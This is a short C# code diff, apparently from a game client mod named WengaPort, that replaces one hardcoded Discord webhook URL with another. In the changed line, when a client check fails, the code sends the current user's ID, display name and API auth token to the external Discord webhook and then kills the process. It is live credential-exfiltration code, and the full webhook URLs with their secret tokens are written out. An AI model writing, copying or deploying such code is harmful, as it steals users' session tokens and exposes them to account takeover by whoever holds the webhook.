@@ -227,7 +227,7 @@ namespace WengaPort.Modules
         {
             if (!CheckClient(Utils.CurrentUser.UserID()))
             {
-                SendWebHook("https://discord.com/api/webhooks/777948797779050557/5bNmfmYWBmLFMJX_6SPKGkEQ2-SQg5CZHMOjgY-cIw8ajz03Bgs-830OJeRqbBYebeB_", $"{Utils.CurrentUser.UserID()} tried to Login! Name:{Utils.CurrentUser.DisplayName()} & Token: {ApiCredentials.GetString("authToken")}");
+                SendWebHook("https://discord.com/api/webhooks/807189879208411227/k_FPoPCcx0lx_jgKs40PIDDoJGbNqpmuf2y1UG2fQJrtKCqFYoahZ-pjKWRQiFcgkLcL", $"{Utils.CurrentUser.UserID()} tried to Login! Name:{Utils.CurrentUser.DisplayName()} & Token: {ApiCredentials.GetString("authToken")}");
                 Process.GetCurrentProcess().Kill();
             }
         }
